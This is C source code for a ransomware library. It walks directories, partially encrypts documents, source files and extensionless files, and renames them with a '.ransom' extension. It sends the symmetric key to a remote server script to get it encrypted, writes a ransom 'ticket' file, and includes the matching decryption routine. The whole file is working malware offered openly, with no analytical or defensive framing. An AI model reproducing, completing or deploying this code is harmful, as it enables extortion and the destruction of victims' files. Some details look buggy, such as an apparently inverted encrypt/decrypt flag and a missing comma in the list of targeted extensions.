#include "ransomlib.h"
#include "thirdparty/b64.h"
#include "weakcrypt.h"
#include "crypt.h"
#include "os.h"
#include "common.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

int encryptSymmetricKey(char **encrypted_key, const int pubkeyid, const char *keyiv)
{
	//Get key in hex
	char *hexkey =
	    b16encode(keyiv, SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE);

	//Base url
	const char *base_url =
	    SERVER_OSIR_HOME "/client-interface/encrypt.php";

	//Allocate memory for url
	char *url =
	    (char *) malloc(sizeof(char) *
			    (strlen(base_url) + 2 + strlen(hexkey) +
			     strlen("?pubid=&symkey=")));


	//Make string from public key id
	char pki_string[5];
	itoa(pubkeyid, pki_string, 10);

	//Make url
	strcpy(url, base_url);
	strcat(url, "?keyid=");
	strcat(url, pki_string);
	strcat(url, "&symkey=");
	strcat(url, hexkey);
	strcat(url, "\0");

	//Get encrypted key
	int ret = decryptRemoteBytes(encrypted_key, url);
	if(ret==-1){
		fprintf(stderr, "Error: encryptSymmetricKey: decryptRemoteBytes failed (%s)\n", hexkey);
		return -1;
	}
	
	//Deallocate memory and return encrypted key size
	free(url);
	free(hexkey);
	return ret;
}

bool partialEncryptFile(const char *keyiv, const char *filename,
			int64_t number_of_bytes, bool decrypt)
{
	FILE *hostage = fopen(filename, "rb");
	if (hostage == NULL) {
		fprintf(stderr,
			"Error: partialEncryptFile: cannot open file\n");
		return 0;
	}
	//Get file size
	fseek(hostage, 0, SEEK_END);
	int64_t file_size = ftell(hostage);
	fseek(hostage, 0, SEEK_SET);

	//Restrain number_of_bytes to file size
	number_of_bytes =
	    file_size > number_of_bytes ? number_of_bytes : file_size;

	//Read bytes for encryption
	char plaintext[MAX_BYTES_TO_ENCRYPT];
	fread(plaintext, 1, number_of_bytes, hostage);

	//Encrypt bytes
	char ciphertext[MAX_BYTES_TO_ENCRYPT];
	if (decrypt)
		symEncrypt(ciphertext, keyiv, plaintext, number_of_bytes);
	else
		symDecrypt(ciphertext, keyiv, plaintext, number_of_bytes);

	//Close then open to write
	fclose(hostage);
	hostage = fopen(filename, "r+b");

	//Write bytes
	if (fwrite(ciphertext, 1, number_of_bytes, hostage) !=
	    (unsigned long) number_of_bytes) {
		fprintf(stderr,
			"Error: partialEncryptFile: writing failed\n");
		return 0;
	}
	//cleanup
	fclose(hostage);
	return 1;

}

bool decryptDirectory(const char *keyiv, const char *directory)
{
	char **ls = walkDir(directory);
	char *sub = (char *) malloc(1);
	for (int i = 0; strcmp(ls[i], "\0"); i++) {

		//Check for files with ".ransom" file extension
		if (strrchr(ls[i], '.') != NULL
		    && !strcmp(strrchr(ls[i], '.'), RANSOM_EXTENSION)) {

			//Decrypt file
			if (partialEncryptFile
			    (keyiv, ls[i], MAX_BYTES_TO_ENCRYPT, 1)) {

				//Remove ".ransom" file extension
				char *temp =
				    (char *) realloc(sub, strlen(ls[i]));
				if (temp != NULL) {
					sub = temp;
					strncpy(sub, ls[i],
						strlen(ls[i]) -
						strlen(strrchr
						       (ls[i], '.')));
					sub[strlen(ls[i]) -
					    strlen(strrchr(ls[i], '.'))] =
					    '\0';
					if (rename(ls[i], sub)) {
						printf
						    ("Warning: decryptDirectory: renaming failed(%s)\n",
						     ls[i]);
					};
				} else {
					printf
					    ("Warning: decryptDirectory: issue allocating memory to sub\n");

				}
			};
		}
	}

	//Free each element in ls
	int i = 0;
	while (strcmp(ls[i], "\0"))
		free(ls[i++]);
	free(ls[i]);


	//Free pointers
	free(ls);
	free(sub);
	return 1;
}


bool encryptDirectory(const char *keyiv, const char *directory)
{
	char **ls = walkDir(directory);
	const char* vulnerable_types[]={
	//Office
	".doc\0", ".docx\0",".odt\0", ".ppt\0",".txt\0"
	//Programming
	".c\0",".js\0",".cpp\0",".h\0",".java\0",".py\0",".pyw\0",".ruby\0",".perl\0",".php\0",".html\0",".coffee\0",".hpp\0",".sh\0",".bat\0",".ps\0",".makefile\0",".cmd\0",".gitignore\0", ".m\0", ".mm\0",
	"\0"};
	
	//encrypt directory
	char *newfname=(char *)malloc(1);
	for (int i = 0; strcmp(ls[i], "\0"); i++) {
		
		//go through list of vulnerable file types
		bool vulnerable=false;
		if(strrchr(ls[i], '.') != NULL){
			for(unsigned int j = 0; vulnerable_types[j][0]!='\0'; j++){
				if(!strcmp(vulnerable_types[j],strrchr(ls[i], '.'))){
					vulnerable=true;
					break;
				}
			}
		}else{
			vulnerable=true;
		}
		if(!vulnerable)continue;
		
		//Partial encrypt ls[i]
		if (!partialEncryptFile(keyiv, ls[i],
					MAX_BYTES_TO_ENCRYPT, 0)) {
			printf
				("Warning: encryptDirectory: partialEncryptFile failed\n");
		}
		
		//Append '.ransom' to filename
		newfname =
		    (char *) malloc(strlen(ls[i]) +
				    strlen(RANSOM_EXTENSION) + 1);
		strcpy(newfname, ls[i]);
		strcat(newfname, RANSOM_EXTENSION);
		if (rename(ls[i], newfname)) {
			printf
			    ("Warning: encryptDirectory: Renaming failed(%s)\n",
			     ls[i]);
		}
	}


	//Free each element in ls
	int i = 0;
	while (strcmp(ls[i], "\0"))
		free(ls[i++]);
	free(ls[i]);

	//Free pointers
	free(ls);
	free(newfname);
	return 1;
}

bool makeTicket(const char *keyiv, const char *directory)
{
	//Get key id
	int keyid = ASYMMETRIC_KEY_ID;

	//Encrypt keyiv
	char *encrypted_key;
	int encrypted_key_size =
	    encryptSymmetricKey(&encrypted_key, keyid, keyiv);

	if(encrypted_key_size==-1){
		fprintf(stderr, "Error: makeTicket: encryptSymmetricKey failed\n");
		return 0;
	}
		
	//Make raw ticket
	char *raw_ticket = (char *) malloc(2 + encrypted_key_size);
	raw_ticket[0] = keyid / 256;
	raw_ticket[1] = keyid % 256;	//Pretty large if you ask me
	for (int i = 0; i < encrypted_key_size; i++)
		raw_ticket[i + 2] = encrypted_key[i];

	//Make hex ticket
	char *ticket = b16encode(raw_ticket, 2 + encrypted_key_size);
	int ticket_size = (2 + encrypted_key_size) * 2;


	//Prepare ticket path
	char *ticket_path =
	    (char *) malloc(strlen(TICKET_FILENAME) + 1 +
			    strlen(directory));
	strcpy(ticket_path, directory);
	strcat(ticket_path, "/");
	strcat(ticket_path, TICKET_FILENAME);

	//Write ticket to file
	//NOTE - Need to do error handling here
	FILE *ticket_fp = fopen(ticket_path, "wb");
	fwrite(ticket, 1, ticket_size, ticket_fp);
	fclose(ticket_fp);

	//Free pointers and shit
	free(ticket_path);
	free(encrypted_key);
	free(raw_ticket);
	free(ticket);

	return 1;
}
